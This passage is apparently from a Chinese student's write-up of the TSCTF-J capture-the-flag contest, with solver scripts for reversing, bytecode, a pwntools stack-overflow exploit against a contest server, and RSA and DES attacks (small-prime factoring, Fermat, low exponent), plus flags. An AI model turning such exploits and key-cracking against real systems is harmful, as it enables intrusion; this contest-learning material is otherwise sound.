a=i^data[i]^<span class="number">0x46</span>;</span><br><span class="line">        cout&lt;&lt;(<span class="built_in">char</span>(a));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag ：TSCTF-J{W3lC0M3_2_ReVEr$E_xOr_1s_O0o_e2}</p>
<p>小寄巧:Ctrl+Alt+方向键 可以往上/下增加光标</p>
<h2 id="bytes_code">bytes_code</h2>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017095253559.png" /></p>
<p>小看一眼，发现是类似汇编语言的东西，上网搜搜</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017095330125.png" /></p>
<p>没有直接可逆的程序，那就看着bytes_code直接逆向</p>
<p>边搜边逆即可得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">114</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">98</span>,<span class="number">121</span>,<span class="number">116</span>,<span class="number">101</span>]</span><br><span class="line">b=[<span class="number">99</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>]</span><br><span class="line">e=[<span class="number">80</span>,<span class="number">115</span>,<span class="number">193</span>,<span class="number">24</span>,<span class="number">226</span>,<span class="number">237</span>,<span class="number">202</span>,<span class="number">212</span>,<span class="number">126</span>,<span class="number">46</span>,<span class="number">205</span>,<span class="number">208</span>,<span class="number">215</span>,<span class="number">135</span>,<span class="number">228</span>,<span class="number">199</span>,<span class="number">63</span>,<span class="number">159</span>,<span class="number">117</span>,<span class="number">52</span>,<span class="number">254</span>,<span class="number">247</span>,<span class="number">0</span>,<span class="number">133</span>,<span class="number">163</span>,<span class="number">248</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">248</span>,<span class="number">236</span>,<span class="number">68</span>]</span><br><span class="line">pos=[<span class="number">9</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">13</span>]</span><br><span class="line">d=[<span class="number">335833164</span>,<span class="number">1155265242</span>,<span class="number">627920619</span>,<span class="number">1951749419</span>,<span class="number">1931742276</span>,<span class="number">856821608</span>,<span class="number">489891514</span>,<span class="number">366025591</span>,<span class="number">1256805508</span>,<span class="number">1106091325</span>,<span class="number">128288025</span>,<span class="number">234430359</span>,<span class="number">314915121</span>,<span class="number">249627427</span>,<span class="number">207058976</span>,<span class="number">1573143998</span>,<span class="number">1443233295</span>,<span class="number">245654538</span>,<span class="number">1628003955</span>,<span class="number">220633541</span>,<span class="number">1412601456</span>,<span class="number">1029130440</span>,<span class="number">1556565611</span>,<span class="number">1644777223</span>,<span class="number">853364248</span>,<span class="number">58316711</span>,<span class="number">734735924</span>,<span class="number">1745226113</span>,<span class="number">1441619500</span>,<span class="number">1426836945</span>,<span class="number">500084794</span>,<span class="number">1534413607</span>]</span><br><span class="line">c=a+b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    a[i]=(a[i]+d[i])^b[pos[i]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    b[i]=b[i]^a[pos[i]]</span><br><span class="line">c=a+b</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    c[i]=(c[i]*d[i])%<span class="number">256</span></span><br><span class="line">    c[i]=e[i]^c[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>flag：TSCTF-J{bY7ecoDe_I$_nOT_so_HArd}</p>
<h1 id="web">WEB</h1>
<p>原本是不想写了，但是看了看我的-100分，还是决定写点什么（</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017095643513.png" /></p>
<p>乐，这说明了JavaScript和PHP极度不过关</p>
<h1 id="pwn">Pwn</h1>
<h2 id="checkin">checkin</h2>
<p>签到题，30分钟速学速做</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017100006348.png" /></p>
<p>发现经典栈溢出gets()</p>
<p>看一眼backdoor()</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017100537634.png" /></p>
<p>只需要ch_0为BUPTBUPT即可</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017101055019.png" /></p>
<p>只需要往buf填充垃圾数据直到ch_0，再加一个BUPTBUPT即可</p>
<p>来写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content=<span class="number">2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> (content==<span class="number">1</span>):</span><br><span class="line">        r=process(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r=remote(<span class="string">&quot;10.21.162.184&quot;</span>,<span class="number">6661</span>)</span><br><span class="line">    payload =<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x10</span>)+<span class="string">b&#x27;1BUPTBUPT&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;[ch] ==&gt; BBBBBBBB\n&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>（照着教程写的脚本）</p>
<p>最后能拿到flag（具体忘了）</p>
<h1 id="crypto">Crypto</h1>
<h2 id="t0nis_rsa">T0ni's_RSA</h2>
<p>我的一血题（乐），脚本写挺快就</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">48</span></span><br><span class="line">flag1=flag[<span class="number">0</span>:<span class="number">12</span>]</span><br><span class="line">flag2=flag[<span class="number">12</span>:<span class="number">24</span>]</span><br><span class="line">flag3=flag[<span class="number">24</span>:<span class="number">36</span>]</span><br><span class="line">flag4=flag[<span class="number">36</span>:<span class="number">48</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====================================flag1&quot;</span>)</span><br><span class="line">m=bytes_to_long(flag1)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">c=powmod(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====================================flag2&quot;</span>)</span><br><span class="line">m=bytes_to_long(flag2)</span><br><span class="line">p=getPrime(<span class="number">64</span>)</span><br><span class="line">q=getPrime(<span class="number">64</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">c=powmod(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====================================flag3&quot;</span>)</span><br><span class="line">m=bytes_to_long(flag3)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=next_prime(p)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">c=powmod(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=====================================flag4&quot;</span>)</span><br><span class="line">m=bytes_to_long(flag4)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">7</span></span><br><span class="line">n=p*q</span><br><span class="line">c=powmod(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================flag1</span></span><br><span class="line"><span class="string">p = 126848068662434725837362927110508359670513097902158347608742478683379412542373205396355795471254038301102414856525121647188484976552142343067044591036870463204973197337043645689668460536955381260032883948287738855267140030987485450026217231376934834164731323791161242646800219869703713605170682364116602398481</span></span><br><span class="line"><span class="string">q = 108831434115512090318037589335170063989256445400295000303568098461799570376658935415095544400164386313684432766346946165811277996284801631673216470358009654117077854125122927553974223129029217160157869796055967783796164293604324171269850795257143703187899358858675646672321319018167474020363026585548820771697</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 12806426835071949867711416962709958594314368469792264574105984900555439512183487926101898057954900183669492820478219013019317212504718045553210233002824678962092820191899047884098185828625477721152790480535997733511787559909800255732856472382084502459064555276405636335011653299264667296955585832665754137638936306114164795630686750776282273654483469063781121080308493239356585954141139584326117462247270605137016151223704623131634401478066683053816761883398796060573577823014077050991745590269109018594293646949390055766822956018083267147781811450534232319486801350308073725708881185484667042111239958769639753074974</span></span><br><span class="line"><span class="string">=====================================flag2</span></span><br><span class="line"><span class="string">n = 117468512089531428663961257960238163911</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 116661533228458434140621528983098975679</span></span><br><span class="line"><span class="string">=====================================flag3</span></span><br><span class="line"><span class="string">n = 13492595256760969040679230352398486845474955975199604800660741616776625780411272813224167801996221854423950963429539941573997611430663873182935561614207154821126761724862959388136641380305863820357311556705058402764857971168891247598952474612658335721334501562320453135569072859647106595744699686106575394155623607871280406174889010332061295980615904318604783210190774745857252314015710989087615728493401949363616443440371076313467788459099129219583070179936217564350523405302532093137784337453902235992607281224617514376983703401850900613434289916680690958012167734859041293116971287070809385300950616506089031207391</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 9556855627975459046740821834528544070427049621127160951742003478725424449033433009828717934730280978533743220944726870403563278379897696996593408941742726761954126312142544881536075456011232335038713394388844246035946642298588354835538957640121051986433171003548328013363624428388045689223434747553158248457199579326477645217581943607544640937724609291757178063476167129106555047385785925998650584941948353305651394629383203202173799027705269424908549510903196317581322985993424298619576745664607011471390391051884932663025002185768778902167735501719300645089512150938345539777564021221129832163135987500087303945958</span></span><br><span class="line"><span class="string">=====================================flag4</span></span><br><span class="line"><span class="string">n = 16311936352179992492322678030084754707912920265012738488001035655568811201293057367042418918656434158566661057011011903060966139141261511970173395803273617809596669492853191556134593000727887389753473207671720940942296594391783348274481657029091989837730022520412600669905401644620228349730622930180575214015304207221073824165287677553936892684490958627884970712382480336987266790423306814756649897559941928884283783109014172545384266583536851269964790353704338665524956130951949158484613551769004309270737394403919413951880647112332734742309798941724190059029780419002154606451025683494409014840175366489059673990383</span></span><br><span class="line"><span class="string">e = 7</span></span><br><span class="line"><span class="string">c = 24352183908812439486066187971806232095447207924326195067955513727448051350160252184726311366048048945796542616778567176778473328388848916602914602254361942853429047133399539108358587787495587158203125</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>flag被分成了4块，然后全是RSA</p>
<h3 id="rsa的基本解题脚本">RSA的基本解题脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">n=p*q</span><br><span class="line">phin=(q-<span class="number">1</span>)(p-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phin)</span><br><span class="line">m=gmpy2.powmod(c, d, n)</span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="flag2">flag2</h3>
<p>发现p，q的位数较小，直接拿yafu分解n得到p,q即可</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017102835421.png" /></p>
<h3 id="flag3">flag3</h3>
<p><strong>q=next_prime(p)</strong>说明|q-p|较小</p>
<p>贴一段exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p,q,e,n,c</span>):</span><br><span class="line">       phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">       d=inverse(e,phi)</span><br><span class="line">       m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">       pt=long_to_bytes(m)</span><br><span class="line">       <span class="keyword">return</span> pt.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_method</span>(<span class="params">nn</span>):</span><br><span class="line">       a=gmpy2.isqrt(nn)+<span class="number">1</span></span><br><span class="line">       k=a**<span class="number">2</span>-n</span><br><span class="line">       <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_square(k):</span><br><span class="line">           a+=<span class="number">1</span></span><br><span class="line">           k=a**<span class="number">2</span>-n</span><br><span class="line">       <span class="keyword">return</span> (gmpy2.isqrt(k)+a),(a-gmpy2.isqrt(k))</span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">p,q=fermat_method(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Succeed! : &quot;</span>,decrypt(p,q,e,n,c))</span><br></pre></td></tr></table></figure>
<h3 id="flag4">flag4</h3>
<p>e=7较小，可以进行低加密指数攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">16311936352179992492322678030084754707912920265012738488001035655568811201293057367042418918656434158566661057011011903060966139141261511970173395803273617809596669492853191556134593000727887389753473207671720940942296594391783348274481657029091989837730022520412600669905401644620228349730622930180575214015304207221073824165287677553936892684490958627884970712382480336987266790423306814756649897559941928884283783109014172545384266583536851269964790353704338665524956130951949158484613551769004309270737394403919413951880647112332734742309798941724190059029780419002154606451025683494409014840175366489059673990383</span></span><br><span class="line">e= <span class="number">7</span></span><br><span class="line">c= <span class="number">24352183908812439486066187971806232095447207924326195067955513727448051350160252184726311366048048945796542616778567176778473328388848916602914602254361942853429047133399539108358587787495587158203125</span></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure>
<p>拼接起来得到flag：</p>
<p>TSCTF-J{T0niii_is_the_most_handsome_boy_in_BUPT}</p>
<h2 id="nonograms">Nonograms</h2>
<p>二血题</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017104356103.png" /></p>
<p>填字游戏，正好在未来之光玩过</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017104553137.png" /></p>
<p>填到第一个是TS就可以直接猜了（</p>
<p>不过最后一个胜是繁体还得填完才知道</p>
<p>锤一下出题人，一开始第一个图有问题</p>
<h2 id="two-keys">Two Keys</h2>
<p>乐，一开始看题两个key都解不出来，这题还是等到hint出来才去写的</p>
<h3 id="q1">Q1</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/Question%201.png" /></p>
<p>Catalan Number</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017113308819.png" /></p>
<p>直接得到key=58786，然后e求出来就可以把flag1解出来</p>
<h3 id="q2">Q2</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(KEY) == <span class="number">8</span></span><br><span class="line">KEY=vmefifty</span><br><span class="line"><span class="comment"># 获取KEY的sha256哈希值</span></span><br><span class="line">sha256_of_KEY = hashlib.sha256(KEY.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;sha256_of_KEY = &quot;, sha256_of_KEY)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sha256_of_KEY = 2b87ea3983c646fcecc476f6930c18bf75935cab40471930f560bef2f370b82e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 工作模式为ECB模式</span></span><br><span class="line">generator = DES.new(KEY.encode(), DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非8整数倍长度明文补位,填充方式为PKCS7</span></span><br><span class="line">padding_len = <span class="number">8</span> - <span class="built_in">len</span>(flag2) % <span class="number">8</span></span><br><span class="line">padding_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(padding_len):</span><br><span class="line">    padding_str += <span class="built_in">chr</span>(padding_len)</span><br><span class="line"></span><br><span class="line">message2 = (flag2 + padding_str).encode()</span><br><span class="line">cipher2 = generator.encrypt(message2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;cipher2 = &quot;, cipher2)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">cipher2 = b&#x27;\x83\xce\x8a\xdac)\xd2\xa41\xe26\xd5\x12\xcf\x9aV;%\x80\xc1\x87\x97\xe0\xc3\x03\x17\xfeR\x97b\x86\xf9&quot;\x1c\xde\xf4\xc1F\xd5\x13\x1e$\xc3\xb8\x84Z&#125;\xac&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>是没见过的题型，先百度（</p>
<p>得知是DES加密，所以只需要把KEY求出来就好了</p>
<p>hashcat省了我100元（乐</p>
<p>不过得找时间研究下DES加密了</p>
<h3 id="解密脚本">解密脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">key = <span class="string">b&#x27;vmefifty&#x27;</span>  <span class="comment"># 密钥 8位或16位,必须为bytes</span></span><br><span class="line">des = DES.new(key,DES.MODE_ECB)</span><br><span class="line">cipher2 = <span class="string">b&#x27;\x83\xce\x8a\xdac)\xd2\xa41\xe26\xd5\x12\xcf\x9aV;%\x80\xc1\x87\x97\xe0\xc3\x03\x17\xfeR\x97b\x86\xf9&quot;\x1c\xde\xf4\xc1F\xd5\x13\x1e$\xc3\xb8\x84Z&#125;\xac&#x27;</span></span><br><span class="line">plain = des.decrypt(cipher2).decode().rstrip(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>
<p>flag合起来：</p>
<p>TSCTF-J{C0mbinAt0rial_M4themat1cs_aNd_Ha$h-Alg0rithms_aRe_1mportaNt_in_CryptOgraphy}</p>
<h2 id="锟斤拷烫烫烫">锟斤拷烫烫烫</h2>
<p>比赛快结束时候做的</p>
<p>一开始根本找不到方向，还以为是要GBK转回UTF再转GBK</p>
<p>后面看了一眼hint</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20221017114340480.png" /></p>
<p>那应该是摩斯电码了</p>
<p>分别试试’锟斤拷‘为. ’烫烫烫‘为- 和’烫烫烫为.‘ ，锟斤拷为’-‘</p>
<p>最后得到nbxxkzdfmjxxq5lfnjuw4z3zmvwgk4lvny======</p>
<p>只有小写和数字，尝试下base32</p>
<p>houdeboxuejingyelequn</p>
<p>厚德博学，敬业乐群(柏油校训了属于是)</p>
<p>最后的flag</p>
<p>TSCTF-J{houdeboxuejingyelequn}</p>
<h2 id="padding">Padding</h2>
<p>难题呜呜呜，敲了好久出题人</p>
<p>先看代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">padding = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    padding.append(getRandomNBitInteger(<span class="number">200</span>))</span><br><span class="line">    c.append(<span class="built_in">pow</span>(bytes_to_long(flag)+padding[i],e,n)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;padding =&quot;</span> , padding)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span> , c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span> , n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">padding = [1335480658797977714182635648750815419879863005458296451759980, 1105478255797648007315023349886665504882795889468318648836489, 1489587392331042893110421129948198972848199336252924080656641, 1382132591349019313051633381580513940696242041200157067276965, 1221660644144301911052632714338747719470438556988174836050945, 1068031555434206518912431828732904834724467895812387259846701, 950167070063725325849144112345647322487251271749089552189663]</span></span><br><span class="line"><span class="string">c = [12156386075808622919884470499999742428948502290502633266714149243391285205946115183803994358397007646732305875732756643202922104933378634777644066483167963571712035489015468459933095323334863890435749390532442705094998642125235372860705341955801015882661076385844505207361041433662302705168420651453751540995834305046607601185709642044598630304091303196332242061466550215712921474914475397203467487247940657328224044308073742136051064572546530378010878973999667554524646802318423870669538570596462520992438639236004336970873550235925980951294570526264437543798875923495522565998539523128411559014373395070473631453566, 972356467391012086833811738641838319861817525445948808480936492147753430144317539441186943288915425511879540996004803019485652431865111396669860993724237438649969203047404242307149508808618203417951441795049448232404787581852741143348397287426740139094336833311562892315049969288568587789688296347942787598418528177855468807885673013470158098351440876237990921668040936715389231560323385934305926601416163595112453649216731937013137806754734815084774350987531334027717653682465954998739503739409608050354323175935659240003166740261566438895662897941156487383985053843011026442739486489133965796784933459982725696775, 1454331173241635142506399589393969737848142032230883803261735992771830972879572777356927192378573602236098153509639254004851722457149699299866825018313710356393311032404598096809195872188404000516094682681608120805204783009461884449600938700582208908008071275372708432058373926046514825469225174662850948103453469645640228992245358487987272421010510232054828326388218459389567499487935461618380719519887213376030129032707221730507737611410014897003976163716558382106260105847931079410590112964316468841736661232278024260233882421020200700231809690412128655803967533305693383240088285028927703779047695827937040223526, 6791050315140572034907086247890255021827941157528628377773625336985099241713427102778852636223584687878215990080372433824322955058613464480617108189761082359213434538466120277962205761611547830153597174687432774237721135920037822836986334562670399081729853703729112157303420394592491725704555824136898847448104644875250763637127686421609288845684388335903531982002388372656868862578909799004367064231152534620384223340723592045963701370582655894522018048966032733363919055570488349419802553623383229984481655602363798805974112682716933192836684530597895409931474679254430700268510470573286649355517536491728232638984, 7803855528608932185856986942413229341623907433814794378053611165978572546437012403689773517160224286896308577300172980049082676322057339129823685973805873488727776853214499550697984658153048467533646511113452267598864956459904881242691987155194349236137541685036215980529287357624758738750558212382770593370702072915476569813585287562678755897891674693964438465669214388136535906743419508690584845308083623921598510789353161937518426346444207305627476448154496505304695996205329923245256088409631062420375506658789911005080300013085062925298859955581516257722553221307542798076144256160430048412994162804891974912474, 4030955227168730192999024888820215710084446645446256115638229327289034528753068830715482258407133210016442070163899418940902654959914066694182808750966415474639300893908465406297056231309133867642983646058147629193679862882170245627204545494805354536331702883561258628109334310233383898676025637286306006540918694751743547505282639111440678988204991167143330138823607522729686549678678449369357241240142964742224147635845150700429830467893337472530683134911312719885601666896354297079217209551761373920977086364082701872522837302700103255427630415742579044731775282454608836816845078464725872366443970727072634331310, 4218225672382185197035762290164180903865366090705038637557093873068863427054297701405534448271309864226675109323258322814404762555787124293418365451067455313522499598139801644066165037500903373077756204200202769507974913689729342621513811350975545529076184628373620819514661867827586261423449259457732493314845375210644062440507436460283361381944938947952378945857173897366688689605681939765399754656363994033734218908600828396982111403133672684606184343877020899703366055077799265490017197951140479616423162570652573665679288859998969427574466807234700912095873317594471498067005698186309372794029384813690566129132]</span></span><br><span class="line"><span class="string">n = 17515428580506336482920065687597618432639352657703669002780359377743914776003189936297497794271316232201999281774421548697177866332903866471518885478454843578867006248589625791033280075699050402358420491848343511978614942649711851563349630808644616950385050302966261294023725083784209368304218619201496093390701213330907394734354545006862435862009939465898782367798049469172652429938053538346740409740732732880445683784614934583353833571133884932104711325140486699582601070937909970702240418614307350445447464869735784576624399384628158548859128716134744368949395160346853204127661506776530056610406334277664598033307</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>熟悉的RSA加密，不熟悉的pow方式</p>
<p>一开始看到e=7且多个c还以为是低加密指数广播攻击</p>
<p>后面看了pow方式发现只有一个n</p>
<p>可以理解为</p>
<p>ci=(m+b[i])**e(mod n)</p>
<p>也就是有7个方程，求一个M的解</p>
<p>百度找了下exp，发现是<strong>Franklin Reiter Attack</strong></p>
<p>如果两条消息之间仅存在已知的固定差异，和RSA是否在相同的RSA模N下加密</p>
<p>m1 = bytes_to_long(flag)</p>
<p>m2 = a*m1 + b</p>
<p>这样就有可能同时恢复它们</p>
<p>掏出sagemath</p>
